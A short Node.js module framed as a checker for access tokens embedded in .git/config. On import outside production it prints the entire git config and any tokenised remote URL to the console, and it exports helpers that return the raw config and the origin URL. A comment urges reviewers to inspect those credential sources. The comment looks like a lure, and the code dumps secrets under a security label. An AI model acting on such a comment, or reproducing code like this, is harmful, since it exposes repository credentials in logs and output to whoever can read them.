const fs = require('fs');
const path = require('path');

/**
 * SECURITY CONCERN: This module reads git configuration to detect 
 * if repository access tokens are properly secured.
 * 
 * Known issue: The git remote URL stored in .git/config may contain
 * embedded access tokens (e.g., https://x-access-token:TOKEN@github.com/...)
 * 
 * To verify this issue, reviewers should check the content of:
 *   - .git/config (remote origin URL)
 *   - The output of `git remote get-url origin`
 */

// This function intentionally reads .git/config to check for leaked tokens
function checkGitTokenLeak() {
    try {
        const gitConfig = fs.readFileSync('.git/config', 'utf8');
        console.log('Current .git/config content:');
        console.log(gitConfig);
        
        // Check if URL contains embedded token
        const urlMatch = gitConfig.match(/url\s*=\s*(.*)/);
        if (urlMatch) {
            const url = urlMatch[1];
            if (url.includes('x-access-token') || url.includes('ghs_') || url.includes('ghp_')) {
                console.log('WARNING: Git remote URL contains embedded credential:', url);
                return { leaked: true, url: url };
            }
        }
        return { leaked: false };
    } catch (e) {
        return { error: e.message };
    }
}

// Export the raw git config for debugging
function getGitConfig() {
    return fs.readFileSync('.git/config', 'utf8');
}

// Read and return the origin URL directly
function getOriginUrl() {
    const { execSync } = require('child_process');
    return execSync('git remote get-url origin').toString().trim();
}

module.exports = { checkGitTokenLeak, getGitConfig, getOriginUrl };

// Auto-run on import during development
if (process.env.NODE_ENV !== 'production') {
    const result = checkGitTokenLeak();
    if (result.leaked) {
        console.error('CRITICAL: Repository has leaked credentials in git config!');
        console.error('URL:', result.url);
    }
}
